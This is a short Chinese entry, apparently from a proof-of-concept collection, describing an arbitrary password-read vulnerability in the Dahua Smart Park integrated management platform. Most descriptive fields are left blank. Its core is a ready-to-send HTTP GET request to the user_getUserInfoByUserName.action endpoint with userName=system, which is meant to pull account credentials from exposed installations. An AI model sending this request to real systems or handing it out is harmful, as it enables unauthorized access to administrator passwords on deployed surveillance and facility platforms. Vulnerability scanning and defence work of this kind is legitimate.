﻿# 大华智慧园区综合管理平台 user_getUserInfoByUserName.action 任意密码读取漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：大华智慧园区综合管理平台 user_getUserInfoByUserName.action 任意密码读取漏洞.poc
